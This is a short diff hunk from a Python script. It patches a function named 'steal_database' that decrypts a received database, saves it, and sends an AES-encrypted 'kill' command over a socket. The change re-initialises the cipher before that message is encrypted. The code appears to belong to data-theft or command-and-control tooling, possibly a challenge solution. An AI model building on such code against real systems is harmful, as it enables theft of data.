@@ -48,6 +48,7 @@ def steal_database():
             data = obj.decrypt(enc_data)
             db.write(data)
     print("Database has been decrypted")
+    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     kill_ciphertext =  obj.encrypt(b"kill" + b"\x00" * 12)
     print("The kill command has been encrypted")
     conn.send(kill_ciphertext)
